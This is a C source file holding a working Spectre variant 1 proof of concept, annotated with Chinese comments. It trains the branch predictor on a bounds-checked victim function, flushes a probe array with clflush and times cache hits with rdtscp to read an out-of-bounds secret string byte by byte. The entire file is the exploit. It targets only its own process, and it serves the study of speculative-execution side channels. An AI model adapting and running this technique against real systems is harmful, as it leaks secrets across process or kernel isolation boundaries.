#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/******************************************************************** 12 Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

// need len == 40
char *secret = "What a sad day, but I still work hard!!\n"; 

uint8_t temp = 0; /* To not optimize out victim_function() */

void victim_function(size_t x)
{
    if (x < array1_size)
    {
        temp &= array2[array1[x] * 512];
    }
}

/******************************************************************** 31 Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]){
    // 因为是 char 所有 256 种可能
    static int results[256];
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    // reset results
    for (i = 0; i < 256; i++){
        results[i] = 0;
    }
        
    for (tries = 999; tries > 0; tries--){
        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]); /* clflush */

        /* 5 trainings (x=training_x) per attack run (x=malicious_x) */
        // 训练的话每次访问 training_x 的地址
        // 相当于 array1[malicious_x] 的值，通过 array2 的 Cache 访问速度得到
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--)
        {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++)
            {
            } /* Delay (can also mfence) */

            /* Bit twiddling to set x=training_x if j % 6 != 0
             * or malicious_x if j % 6 == 0 */
            /* Avoid jumps in case those tip off the branch predictor */
            /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = ((j % 6) - 1) & ~0xFFFF;
            /* Set x=-1 if j&6=0, else x=0 */
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));
            /* Call the victim! */
            victim_function(x);
        }

        /* Time reads. Mixed-up order to prevent stride prediction */
        // 同 hash 的方法检查 array2 每一个 避免被处理器预测提前取出来
        for (i = 0; i < 256; i++){
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk);
            junk = *addr;                    /* Time memory access */
            time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit -> score +1 for this value */
        }

        /* Locate highest & second-highest results */
        j = k = -1;
        for (i = 0; i < 256; i++){
            if (j < 0 || results[i] >= results[j]){
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Success if best is > 2*runner-up + 5 or 2/0) */
    }
    /* use junk to prevent code from being optimized out */
    results[0] = results[0] ^ junk;
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, const char **argv){
    // 敏感数据和可以访问的  array1 之间的距离
    size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */

    // score 和 value 用来保存值最高的两个
    int i, score[2], len = 40;
    uint8_t value[2];

    // 确保 array2 在内存里
    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* write to array2 to ensure it is memory backed */

    printf("Reading %d bytes:\n", len);
    while (--len >= 0){
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        // 逐个探测 secrete 里的字符
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear"); // 如果第一个严格超过第二个两倍
        printf("0x%02X=’%c’ score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");
    }
    return 0;
}


